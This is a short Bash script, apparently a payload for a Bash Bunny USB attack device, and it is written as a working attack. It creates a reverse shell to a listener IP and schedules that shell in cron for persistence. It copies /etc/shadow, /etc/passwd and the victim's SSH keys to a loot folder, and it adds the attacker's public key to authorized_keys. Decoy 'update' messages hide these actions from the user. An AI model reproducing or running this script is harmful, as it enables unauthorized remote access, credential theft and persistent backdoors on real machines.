#!/bin/bash

# Main Payload

# Set variables for METERPRETER Reverse_TCP Session, CRON schedule, Attacker's RSA Key, etc..
RSA_KEY='PLACEHOLDER-FOR-RSA-PUBLIC-KEY' # replace with the contents of ~/.ssh/id_rsa.pub or whatever your RSA public key file is named
REVERSESHELL=true
LHOST='10.20.20.104'  # Reverse Shell listening host IP
LPORT='4444'   # Reverse Shell listening host port
CRON='30 */1 * * *'  # Just the timing portion of the CRON job
ATTACKER_HOST='engineering@kali-2'  # Tail end of RSA key from above.  Do not include spaces
DT=$(date "+%Y.%m.%d-%H.%M.%S")
DN=/media/$USER/BashBunny/loot/$USER-$HOSTNAME-$DT

if [ "$REVERSESHELL" = true ] ; then
    # Create reverse shell script
    echo "#!/bin/bash"> .config/rs.sh ;
    echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1">> .config/rs.sh ;
    chmod +x /home/$USER/.config/rs.sh ;

    # Add task to CRON that launches the Reverse_TCP script on a schedule  for persistence
    crontab -l > crontab.tmp ;
    if grep -Fq .config/rs.sh crontab.tmp; then
        echo 'Update in progress.'
    else
        echo "$CRON /home/$USER/.config/rs.sh" >> crontab.tmp ;
        crontab crontab.tmp ;
    fi
    rm -f crontab.tmp ;
fi

# Smash & Grab the loot!!  (Get what you can now and work on PrivEsc later)
mkdir $DN ;
ip addr > $DN/ip-addr.txt ;
whoami > $DN/whoami.txt ;
cat /proc/net/arp > $DN/arp.txt ;
cat /etc/passwd > $DN/etc-passwd.txt ;
cat /etc/shadow > $DN/etc-shadow.txt ;
uname -a > $DN/uname-a.txt ;
route -n > $DN/route-n.txt ;
cp  /home/$USER/.ssh/* $DN/. ;

# Add Attacker's RSA key to .ssh/authorized_keys for additional persistence
if grep -Fq $ATTACKER_HOST .ssh/authorized_keys ; then
    echo 'Update almost completed.'
else
    echo $RSA_KEY >> .ssh/authorized_keys ;
fi
